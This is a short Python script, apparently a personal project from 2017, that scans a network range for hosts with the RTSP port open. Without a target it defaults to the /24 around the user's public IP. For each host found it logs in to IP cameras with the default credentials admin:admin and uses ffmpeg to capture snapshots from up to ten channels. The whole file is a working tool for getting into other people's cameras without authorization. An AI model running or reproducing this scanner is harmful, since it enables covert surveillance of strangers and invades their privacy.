#!/usr/bin/python3
'''
NEW RSTP PROJECT
05/02/2017 by borrachinha
'''

def openPort(target):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.20)
    result = sock.connect_ex((target, 554))
    sock.close()

    if result == 0:
        print(target + " - OPEN")
        t_exploitRstp = Thread(target=exploitRstp, args=[target])
        t_exploitRstp.start()

def exploitRstp(ip):
    for i in range(10):
        print('Passou aqui?')
        command = ("rtsp://admin:admin@{0}:554/cam/realmonitor?channel={1}&subtype=0".format(ip, i+1))
        cam = 'cam-{0}-{1}.jpeg &'.format(ip, i+1)
        subprocess.Popen(['/usr/bin/ffmpeg', '-i', command, '-f', 'image2', cam], stdout=subprocess.PIPE)

if __name__ == '__main__':
    try:
        import socket
        import ipcalc
        import subprocess
        import re
        import argparse
        import requests
        from threading import Thread

        parser = argparse.ArgumentParser(description='Change options for execute the Script',
                                         prefix_chars='--')

        parser.add_argument('--target', action='store', type=str,
                            help='Use for set Network')
        '''
        parser.add_argument('--fast', action='store', type=str,
                            help='fast action')
        '''
        result = parser.parse_args()

        if result.target != None:
            print('Scanning - ' + result.target)
            network = result.target
            for ip in ipcalc.Network(network):
                openPort(str(ip))

        if result.target == None:
            network = '{0}/24'.format(requests.get('https://ipapi.co/ip/').text)
            print('Scanning your Network "/24" - ' + network)
            for ip in ipcalc.Network(network):
                openPort(str(ip))

        else:
            print("Please enter the valid option")

    except Exception as err:
        print("Option unknow\nTry --help")
        print(err)